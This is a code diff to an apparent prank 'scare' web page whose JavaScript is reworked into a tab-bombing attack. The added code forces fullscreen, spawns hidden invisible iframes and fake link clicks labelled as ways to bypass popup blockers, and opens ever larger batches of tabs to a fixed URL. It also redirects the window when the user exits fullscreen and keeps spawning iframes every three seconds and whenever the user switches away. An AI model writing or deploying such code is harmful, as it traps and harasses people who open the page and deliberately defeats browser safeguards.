@@ -9,6 +9,7 @@
       height: 100%;
       background: black;
       cursor: pointer; 
+      overflow: hidden;
     }
     #scareVideo {
       display: none;
@@ -51,6 +52,16 @@
       text-align: center;
       z-index: 1000;
     }
+
+    /* Hidden iframes that will load the URL */
+    .hiddenIframe {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+      border: none;
+    }
   </style>
 </head>
 <body>
@@ -66,23 +77,58 @@
     const pageBody = document.body;
     const video = document.getElementById('scareVideo');
     const overlayText = document.getElementById('overlayText');
-    let tabsOpened = false;
     const url = 'https://loganexotic.github.io/zakusone/';
+    let iframesCreated = 0;
+    let tabsOpened = false;
 
-    function openTabs(count) {
-      for (let i = 0; i < count; i++) {
-        // Try multiple methods to open tabs
+    // Method 1: Create hidden iframes (bypasses popup blocker)
+    function createIframe() {
+      const iframe = document.createElement('iframe');
+      iframe.src = url;
+      iframe.className = 'hiddenIframe';
+      iframe.id = 'iframe_' + iframesCreated;
+      iframesCreated++;
+      document.body.appendChild(iframe);
+      return iframe;
+    }
+
+    // Method 2: Try to open actual tabs using user gesture
+    function openTabWithUserGesture() {
+      try {
         const win = window.open(url, '_blank');
-        // If popup blocked, try alternative
         if (!win || win.closed || typeof win.closed == 'undefined') {
-          // Create hidden link and click it
-          const a = document.createElement('a');
-          a.href = url;
-          a.target = '_blank';
-          a.rel = 'noopener noreferrer';
-          document.body.appendChild(a);
-          a.click();
-          document.body.removeChild(a);
+          // If blocked, use the iframe method
+          createIframe();
+        }
+      } catch(e) {
+        createIframe();
+      }
+    }
+
+    // Method 3: Create a fake click on a link (works sometimes)
+    function fakeClickOpen() {
+      const a = document.createElement('a');
+      a.href = url;
+      a.target = '_blank';
+      a.rel = 'noopener noreferrer';
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      setTimeout(() => {
+        document.body.removeChild(a);
+      }, 100);
+    }
+
+    // Massive tab opening function
+    function openMassTabs(count) {
+      for (let i = 0; i < count; i++) {
+        // Cycle through methods to maximize success
+        if (i % 3 === 0) {
+          openTabWithUserGesture();
+        } else if (i % 3 === 1) {
+          fakeClickOpen();
+        } else {
+          createIframe();
         }
       }
     }
@@ -94,41 +140,45 @@
       // Show video
       video.style.display = 'block';
 
-      // Force fullscreen on the video
-      if (video.requestFullscreen) {
-        video.requestFullscreen();
-      } else if (video.webkitRequestFullscreen) {
-        video.webkitRequestFullscreen();
-      } else if (video.msRequestFullscreen) {
-        video.msRequestFullscreen();
+      // Force fullscreen
+      const elem = document.documentElement;
+      if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+      } else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen();
+      } else if (elem.msRequestFullscreen) {
+        elem.msRequestFullscreen();
       }
 
       video.play();
 
-      // Open tabs immediately
+      // Open tabs - using the click event as user gesture
       if (!tabsOpened) {
         tabsOpened = true;
         
-        // Open 8 tabs immediately
-        openTabs(8);
+        // Open 10 tabs/iframes immediately
+        openMassTabs(10);
 
-        // Open more after delays
-        setTimeout(() => { openTabs(5); }, 200);
-        setTimeout(() => { openTabs(5); }, 500);
-        setTimeout(() => { openTabs(5); }, 800);
+        // More after delays
+        setTimeout(() => { openMassTabs(8); }, 300);
+        setTimeout(() => { openMassTabs(8); }, 600);
+        setTimeout(() => { openMassTabs(8); }, 1000);
       }
 
     }, { once: true });
 
-    // Force open tabs when fullscreen changes
+    // When fullscreen exits, open more
     function handleFullscreenExit() {
       if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.msFullscreenElement) {
-        // User exited fullscreen - open a huge batch
-        openTabs(15);
-        // And keep opening more
-        setTimeout(() => { openTabs(10); }, 300);
-        setTimeout(() => { openTabs(10); }, 600);
-        setTimeout(() => { openTabs(10); }, 1000);
+        // Open a LOT more
+        openMassTabs(20);
+        setTimeout(() => { openMassTabs(15); }, 500);
+        setTimeout(() => { openMassTabs(15); }, 1000);
+        
+        // Also try to redirect the main window
+        try {
+          window.location.href = url;
+        } catch(e) {}
       }
     }
 
@@ -136,28 +186,31 @@
     document.addEventListener('webkitfullscreenchange', handleFullscreenExit);
     document.addEventListener('msfullscreenchange', handleFullscreenExit);
 
-    // Also detect visibility change to catch when user comes back
-    document.addEventListener('visibilitychange', () => {
-      if (document.hidden) {
-        // User switched tabs/window - open more tabs
-        setTimeout(() => { openTabs(10); }, 100);
-      }
-    });
-
-    // Click anywhere after fullscreen to open more
+    // Every time user clicks while in fullscreen
     document.addEventListener('click', () => {
-      if (tabsOpened && !document.fullscreenElement) {
-        openTabs(8);
+      if (tabsOpened && document.fullscreenElement) {
+        openMassTabs(5);
       }
     });
 
-    // Keep opening tabs periodically while page is active
+    // Spam iframes continuously
     setInterval(() => {
       if (tabsOpened) {
-        openTabs(3);
+        for (let i = 0; i < 5; i++) {
+          createIframe();
+        }
       }
-    }, 5000);
+    }, 3000);
 
+    // Also when user leaves the page
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden && tabsOpened) {
+        // User alt-tabbed away - open more
+        setTimeout(() => { openMassTabs(10); }, 100);
+      }
+    });
+
+    console.log('✅ Ready - click the screen!');
   </script>
 
 </body>
